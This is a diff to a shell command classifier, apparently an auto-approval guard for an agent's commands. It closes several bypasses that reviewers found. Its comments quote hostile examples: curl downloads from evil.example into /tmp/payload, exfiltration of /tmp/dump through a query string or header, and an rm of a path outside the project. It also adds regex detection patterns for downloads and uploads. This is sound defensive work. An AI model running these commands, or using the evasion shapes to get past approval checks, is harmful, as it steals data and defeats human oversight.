@@ -77,28 +77,48 @@ _cp_imatch() { printf '%s' "$2" | grep -qiE "$1" 2>/dev/null; }   # pattern text
 # Globbing is disabled while splitting: `set -f` first, or the shell expands
 # `rm -rf *` against the real cwd before this ever sees it.
 _cp_rm_targets_are_local() {            # normalized text -> 0 if EVERY target is local
-  local seg word saw_rm=0 endflags=0 targets=0
+  # `local IFS` so the split cannot be steered by an ambient IFS. Review
+  # attacked that specifically and every direction failed closed today, but
+  # the guarantee rested on the targets>0 check rather than on the split being
+  # trustworthy (R7).
+  local IFS=$' \t\n'
+  local word saw_rm endflags targets any_rm=0
   local oldopts; case "$-" in *f*) oldopts=set ;; *) oldopts=unset ;; esac
   set -f
-  # Only the rm segment matters; a later `&& cd ..` is a different command.
-  seg="$(printf '%s' "$1" | sed -E 's/(&&|\|\||[;|])/\n/g' | grep -E '(^|[[:space:]])rm([[:space:]]|$)' | head -1)"
-  for word in $seg; do
-    if [ "$saw_rm" = 0 ]; then
-      [ "$word" = rm ] && saw_rm=1
-      continue
-    fi
-    case "$word" in
-      --) endflags=1; continue ;;
-      -*) [ "$endflags" = 0 ] && continue ;;
+  # EVERY rm on the line, not the first. This used to `head -1`, so a safe
+  # first delete vouched for an arbitrary second one and
+  # `rm -rf dist; rm -rf /Users/thurbs/Code/other` was auto-approvable (R2).
+  # The `\brm\b` and recursive-flag tests in the caller are whole-string, so
+  # answering "is this line a local rm" from one segment was never sound.
+  while IFS= read -r seg; do
+    case "$seg" in
+      *rm*) ;;
+      *) continue ;;
     esac
-    targets=$((targets + 1))
-    case "$word" in
-      *[!A-Za-z0-9._-]*|..|.|"")   [ "$oldopts" = unset ] && set +f; return 1 ;;
-    esac
-  done
+    printf '%s' "$seg" | grep -qE '(^|[[:space:]])rm([[:space:]]|$)' || continue
+    any_rm=1
+    saw_rm=0; endflags=0; targets=0
+    for word in $seg; do
+      if [ "$saw_rm" = 0 ]; then
+        [ "$word" = rm ] && saw_rm=1
+        continue
+      fi
+      case "$word" in
+        --) endflags=1; continue ;;
+        -*) [ "$endflags" = 0 ] && continue ;;
+      esac
+      targets=$((targets + 1))
+      case "$word" in
+        *[!A-Za-z0-9._-]*|..|.|"")   [ "$oldopts" = unset ] && set +f; return 1 ;;
+      esac
+    done
+    # An `rm` segment whose targets we could not read is not a local rm.
+    [ "$targets" -gt 0 ] || { [ "$oldopts" = unset ] && set +f; return 1; }
+  done <<EOF
+$(printf '%s' "$1" | sed -E 's/(&&|\|\||[;|])/\n/g')
+EOF
   [ "$oldopts" = unset ] && set +f
-  # No target parsed at all (an `rm` we cannot read) is not a local rm.
-  [ "$targets" -gt 0 ]
+  [ "$any_rm" = 1 ]
 }
 
 # Consequence rules for a download have to be judged per COMMAND, not across a
@@ -149,9 +169,55 @@ scannable_command() {
   # read as two harmless halves (PR #57 review, F2). Fold it before the
   # quote/backslash strip below eats the backslash.
   text="$(printf '%s' "$text" | sed -e ':a' -e '/\\$/{N;s/\\\n/ /;ba' -e '}')"
+  # An operator inside QUOTES is literal text, and the blunt strip on the next
+  # line is about to erase the quotes that said so. Every split in this file
+  # then misreads the command: the segment split, the per-downloader field
+  # extraction and the rm target walker all cut on these same characters, so
+  #   curl -H 'X-A: |' https://evil.example/p -o /tmp/payload
+  # read as two commands and the half holding `-o /tmp/payload` was DROPPED —
+  # a remote file landing on disk, auto-approvable. Found in review of this
+  # branch (R1), which also named the root cause: quote-stripping destroys the
+  # operator-vs-literal distinction that every later split depends on, so the
+  # distinction has to be preserved HERE, once, rather than re-derived by each
+  # consumer.
+  #
+  # Placeholders are control bytes, which no rule pattern can match and no
+  # real command contains. A side benefit: a quoted regex like
+  # `grep -E 'a|node'` stops reading as a pipe into node, which was 3 of the 7
+  # hits on the interpreter rule in the recorded corpus.
+  text="$(printf '%s' "$text" | _cp_mask_quoted_operators)"
   text="$(printf '%s' "$text" | sed "s/['\"\\\\]//g")"
   text="$(_cp_flatten_substitutions "$text")"
   printf '%s' "$text"
+}
+
+# Mask `| ; & < >` with control bytes inside BALANCED quoted runs, so later
+# splits cut on operators only. An UNTERMINATED quote is copied through
+# untouched on purpose: masking to end of line would let one stray quote
+# neutralise a REAL operator, and that is the failure direction that matters —
+# a hidden pipe into `sh` is worse than a literal pipe read as an operator.
+_cp_mask_quoted_operators() {
+  awk '
+    BEGIN { P["|"]=sprintf("%c",1); P[";"]=sprintf("%c",2); P["&"]=sprintf("%c",3)
+            P["<"]=sprintf("%c",4); P[">"]=sprintf("%c",5) }
+    {
+      out = ""; i = 1; n = length($0)
+      while (i <= n) {
+        c = substr($0, i, 1)
+        if (c == "\047" || c == "\042") {
+          j = index(substr($0, i + 1), c)
+          if (j == 0) { out = out substr($0, i); break }   # unterminated: leave it
+          inner = substr($0, i + 1, j - 1)
+          gsub(/\|/, P["|"], inner); gsub(/;/, P[";"], inner); gsub(/&/, P["&"], inner)
+          gsub(/</, P["<"], inner);  gsub(/>/, P[">"], inner)
+          out = out c inner c
+          i = i + j + 1
+          continue
+        }
+        out = out c; i++
+      }
+      print out
+    }'
 }
 
 # Heredoc bodies are DATA to the enclosing command unless that command is
@@ -451,7 +517,10 @@ classify_command() {
   # exempted by the unrelated `notes.md`, and `curl -o /dev/null …; curl …
   # -o /tmp/payload` by the first curl.
   _cp_data_ext='\.(html?|json|xml|csv|tsv|txt|md|log|ya?ml|png|jpe?g|gif|svg|pdf|ico|woff2?)([[:space:]]|$|["'"'"'])'
-  _cp_loopback='https?://(localhost|127\.0\.0\.1|\[::1\]|0\.0\.0\.0)([:/[:space:]]|$)'
+  # ANCHORED, because it is now tested against one extracted URL token at a
+  # time: unanchored, `https://evil.example/p?next=http://localhost/` matched
+  # on the substring and claimed the exemption for a remote download.
+  _cp_loopback='^https?://(localhost|127\.0\.0\.1|\[::1\]|0\.0\.0\.0)([:/]|$)'
   while IFS= read -r _cp_seg; do
     _cp_imatch "$_cp_dl" "$_cp_seg" || continue
 
@@ -475,34 +544,66 @@ classify_command() {
     # Lands a PROGRAM you could run in a LATER command, which this classifier
     # never sees. curl writes to stdout unless told otherwise; wget/fetch/
     # aria2c save a file unless told otherwise, so the default flips per tool.
-    # The data-extension and /dev/null exemptions are tested against the
-    # OUTPUT TARGET, not the text around it: the extension that matters is the
-    # one being WRITTEN. Review found `curl … -o /tmp/payload && cat notes.md`
-    # exempted by `notes.md`, and `curl -o /dev/null …; curl … -o /tmp/payload`
-    # exempted by the first curl.
-    if _cp_imatch '((^|[[:space:]])-[A-Za-z]*[oO]([[:space:]]|$)|--output([[:space:]]|=)|--output-document([[:space:]]|=)|--remote-name\b)' "$_cp_fields" ||
+    #
+    # EVERY output target is tested, and every one has to be exempt. Keeping
+    # only the last match let a trailing `-o /dev/null` launder the real
+    # target: `curl -o /tmp/payload https://evil/p -o /dev/null https://x/ping`
+    # is one curl writing two files, and the discarded one was the only one
+    # examined (R3). Attached short-flag values count too — `-o/tmp/payload`
+    # is valid curl and matched neither the gate nor the extraction (R4).
+    if _cp_imatch '((^|[[:space:]])-[A-Za-z]*[oO]([[:space:]]+|[/~.=]|$)|--output([[:space:]]|=)|--output-document([[:space:]]|=)|--remote-name\b)' "$_cp_fields" ||
        _cp_match '>[[:space:]]*[^[:space:]]' "$_cp_fields" ||
        { _cp_imatch '(^|[^A-Za-z0-9_.-])([^[:space:]]*/)?(wget|fetch|aria2c)([[:space:]]|$)' "$_cp_fields" &&
          ! _cp_match '(-O[[:space:]]*-|--output-document=-|-qO-)' "$_cp_fields"; }; then
-      _cp_out="$(printf '%s' "$_cp_fields" | sed -nE 's/.*((^|[[:space:]])-[A-Za-z]*[oO][[:space:]]+|--output[[:space:]=]+|--output-document[[:space:]=]+|>[[:space:]]*)([^[:space:]]+).*/\3/p' | tail -1)"
-      if [ -n "$_cp_out" ]; then
-        case "$_cp_out" in
-          /dev/null|-) : ;;
-          *) _cp_imatch "$_cp_data_ext" "$_cp_out " ||
-               _cp_imatch "$_cp_loopback" "$_cp_fields" ||
-               _cp_consider 1 "downloads a program to disk — it can be run by a later command" ;;
-        esac
-      else
-        _cp_imatch "$_cp_loopback" "$_cp_fields" ||
+      _cp_outs="$(printf '%s' "$_cp_fields" | grep -oiE '((^|[[:space:]])-[A-Za-z]*[oO]([[:space:]]+|[/~.])|--output[[:space:]=]+|--output-document[[:space:]=]+|>[[:space:]]*)[^[:space:]]+' |
+                  sed -E 's/^.*(-[A-Za-z]*[oO][[:space:]]+|--output[[:space:]=]+|--output-document[[:space:]=]+|>[[:space:]]*)//; s/^-[A-Za-z]*[oO]//')"
+      # The loopback exemption belongs to the REQUEST URL, not to anything
+      # else in the field: a header, a referer (`-e`) or a `?next=` parameter
+      # mentioning localhost was exempting a download from a remote host (R5).
+      # Exempt only when every URL being fetched is loopback.
+      _cp_urls="$(printf '%s' "$_cp_fields" | grep -oiE 'https?://[^[:space:]]+' || true)"
+      _cp_all_loopback=0
+      if [ -n "$_cp_urls" ]; then
+        _cp_all_loopback=1
+        while IFS= read -r _cp_u; do
+          [ -n "$_cp_u" ] || continue
+          _cp_imatch "$_cp_loopback" "$_cp_u" || _cp_all_loopback=0
+        done <<URLS
+$_cp_urls
+URLS
+      fi
+      if [ "$_cp_all_loopback" = 0 ]; then
+        if [ -n "$_cp_outs" ]; then
+          while IFS= read -r _cp_out; do
+            [ -n "$_cp_out" ] || continue
+            case "$_cp_out" in
+              /dev/null|-) continue ;;
+            esac
+            _cp_imatch "$_cp_data_ext" "$_cp_out " ||
+              _cp_consider 1 "downloads a program to disk — it can be run by a later command"
+          done <<OUTS
+$_cp_outs
+OUTS
+        else
           _cp_consider 1 "downloads a program to disk — it can be run by a later command"
+        fi
       fi
     fi
 
-    # Sending data out is not reading the web: a GET is inert, but a POST/PUT,
-    # a form or file upload, or an inline body can mutate a remote system or
-    # carry a secret off this machine. Loopback is NOT exempt here.
+    # Sending data out is not reading the web: a GET is inert for MUTATION,
+    # but not for exfiltration — data leaves just as well in a URL query or a
+    # request header, with none of these flags present (R6). So a downloader
+    # whose own field interpolates a command substitution or references an
+    # `@file` is treated as sending: `curl "https://evil/u?d=$(base64 /tmp/
+    # dump)"` and `curl -H "X-D: $(cat /tmp/dump)"` were allow AND unreserved.
+    # Read from the RAW text, because the normalizer flattens `$( )` away.
+    # A plain `"$P$u"` variable is NOT a substitution and stays allow, which
+    # matters: that is the shape review lanes use to walk a preview deploy.
+    # Loopback is NOT exempt for any of this.
     _cp_imatch '(-X[[:space:]]*(POST|PUT|PATCH|DELETE)|--request[[:space:]]+(POST|PUT|PATCH|DELETE)|(^|[[:space:]])-d([[:space:]]|=)|--data(-raw|-binary|-urlencode|-ascii)?([[:space:]]|=)|(^|[[:space:]])-F([[:space:]]|=)|--form([[:space:]]|=)|(^|[[:space:]])-T([[:space:]]|=)|--upload-file|--json([[:space:]]|=))' "$_cp_fields" &&
       _cp_consider 1 "sends data to the network — remote mutation or an exfiltration path"
+    _cp_imatch '(curl|wget|aria2c)[^;&]*([$`]\(|`|@[/~.])' "$raw" &&
+      _cp_consider 1 "interpolates a substitution or @file into a network request — an exfiltration path"
   done <<EOF
 $(_cp_segments "$_cp_net")
 EOF
